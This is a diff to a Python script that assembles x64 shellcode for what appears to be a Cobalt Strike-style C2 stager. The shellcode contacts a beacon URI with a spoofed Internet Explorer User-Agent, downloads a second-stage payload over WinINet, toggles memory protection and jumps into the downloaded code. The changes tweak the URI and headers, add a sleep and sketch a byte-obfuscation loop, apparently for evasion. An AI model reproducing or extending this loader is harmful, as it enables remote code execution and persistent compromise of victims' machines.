@@ -1,7 +1,7 @@
 """
-IP address at line: 226
-Port at line: 231
-URI (or search beacon uri) at line: 251
+IP address at line: 227
+Port at line: 232
+URI (or search beacon uri) at line: 252
 """
 
 import ctypes, struct
@@ -249,7 +249,7 @@ def main():
         "   xor rdx, rdx                    ;"  # Second arg, lpszVerb, NULL
         "   push rdx                        ;"  # Alignment
         "   push rdx                        ;"  # NULL byte
-        "   mov rax, 0x596a57432f           ;"  # Beacon URI
+        "   mov rax, 0x7a55434b2f           ;"  # Beacon URI
         "   push rax                        ;"
         "   mov r8, rsp                     ;"  # Third arg, lpszObjectName
         "   xor r9, r9                      ;"  # Fourth arg, lpszVersion, NULL
@@ -303,21 +303,21 @@ def main():
         " call_httpsendrequesta:            "
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
         "   mov rcx, [rbp+0x68]             ;"  # First arg, hRequest
-        "   mov rax, 0x2953                 ;"
+        "   mov rax, 0x6f6b63654720         ;"
         "   push rax                        ;"
-        "   mov rax, 0x4a434c414d203b30     ;"
+        "   mov rax, 0x656b696c2029302e     ;"
         "   push rax                        ;"
-        "   mov rax, 0x2e352f746e656469     ;"
+        "   mov rax, 0x31313a7672203b30     ;"
         "   push rax                        ;"
-        "   mov rax, 0x7254203b3436574f     ;"
+        "   mov rax, 0x2e372f746e656469     ;"
         "   push rax                        ;"
-        "   mov rax, 0x57203b312e362054     ;"
+        "   mov rax, 0x7254203b332e3620     ;"
         "   push rax                        ;"
-        "   mov rax, 0x4e2073776f646e69     ;"
+        "   mov rax, 0x544e2073776f646e     ;"
         "   push rax                        ;"
-        "   mov rax, 0x57203b302e392045     ;"
+        "   mov rax, 0x6957202c31312045     ;"
         "   push rax                        ;"
-        "   mov rax, 0x49534d203b656c62     ;"
+        "   mov rax, 0x49534d202c656c62     ;"
         "   push rax                        ;"
         "   mov rax, 0x697461706d6f6328     ;"
         "   push rax                        ;"
@@ -328,7 +328,7 @@ def main():
         "   mov rax, 0x6567412d72657355     ;"
         "   push rax                        ;"
         "   mov rdx, rsp                    ;"  # Second arg, lpszHeaders, the header in malleable config file
-                                                # User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALCJS) in this case
+                                                # User-Agent: Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
         "   mov r8, 0xffffffffffffffff      ;"  # Third arg, dwHeadersLength, -1L
         "   xor r9, r9                      ;"  # Fourth arg, lpOptional, NULL
         "   push r9                         ;"  # Fifth arg, dwOptionalLength, NULL
@@ -341,7 +341,7 @@ def main():
         " retry:                            "   # If failed, retry 10 times
         "   dec rdi                         ;"  # Decrease counter
         "   jz call_terminate_process       ;"  # If failed 10 times, terminate process
-        "   je call_internetsetoptiona     ;"  # Retry
+        "   je call_internetsetoptiona      ;"  # Retry
         
         " call_localalloc:                  "   # Call LocalAlloc to allocate buffer for stage 2
         "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
@@ -365,7 +365,7 @@ def main():
         " call_internetreadfile:            "
         "   mov rcx, [rbp+0x68]             ;"  # First arg, hFile
         "   mov rdx, r13                    ;"  # Second arg, lpBuffer
-        "   mov r8, 0x1000                  ;"  # Third arg, dwNumberOfBytesToRead, 4096 bytes
+        "   mov r8, 0x1                     ;"  # Third arg, dwNumberOfBytesToRead, 4096 bytes
         "   mov r9, rsi                     ;"  # Fourth arg, lpdwNumberOfBytesRead, on stack
         "   add rsp, 0xffffffffffffffe0     ;"  # Home space
         "   call qword ptr [rbp+0x60]       ;"  # Call InternetReadFile
@@ -374,9 +374,30 @@ def main():
         " process_bytes_read:               ;"
         "   xor rax, rax                    ;"
         "   mov ax, word ptr [rsi]          ;"
+        
+        
+        
+        #"   xor rdi, rdi                    ;"
+        #"   add rdi, 0x1                    ;"  # Counter
+        
+        
+        #" obfuscate_byte:                   ;"
+        #"   dec rdi                         ;"
+        #"   mov dl, [r13+rdi]               ;"
+        #"   add dl, 0x9                     ;"
+        #"   mov [r13+rdi], dl               ;"
+        #"   test rdi, rdi                   ;"
+        #"   jnz obfuscate_byte              ;"
+        
+        
+
+        " shift_buffer:                     ;"
         "   add r13, rax                    ;"  # Add bytes read to R13, buffer shitfs to position for next read
         "   add r15, rax                    ;"  # This is total bytes received so far
-
+        
+        
+        
+        
         " check_bytes_read:                 "
         "   cmp eax, 0x0                    ;"  # Check if there's any bytes read
         "   jnz call_internetreadfile       ;"  # Keep reading
@@ -411,6 +432,8 @@ def main():
         " prep_stage_2:                     "
 
         # ====== VirtualProtect PAGE_NOACCESS =======
+        # This is actually useless implementation, too lazy to remove and test again
+        # let it be -_-
         "   mov rsi, 0x4cf1894c80c48348     ;"
         "   mov [r14], rsi                  ;"
         "   mov rsi, 0xe18949c08949fa89     ;"
@@ -448,6 +471,13 @@ def main():
         "   mov r13, r14                    ;"  # R13 points to buffer now
         "   mov al, 0x1                     ;"  # PAGE_NOACCESS
         "   add r14, 0x1000                 ;"  # Start of stage 2 where to mark as PAGE_NOACCESS
+      
+        " call_sleep:                       "
+        "   add rsp, 0xffffffffffffff80     ;"  # Allocate stack space
+        "   mov rcx, 0x2710                 ;"  # 10 sec
+        "   add rsp, 0xffffffffffffffe0     ;"  # Home space
+        "   call qword ptr [rbp+0x70]       ;"  # Call Sleep
+        "   add rsp, 0xa0                   ;"  # Cleanup
          
         " execute:                          "
         "   jmp r13                         ;"  # Execute
@@ -493,4 +523,5 @@ def main():
  
 if __name__ == "__main__":
     main()
+
 
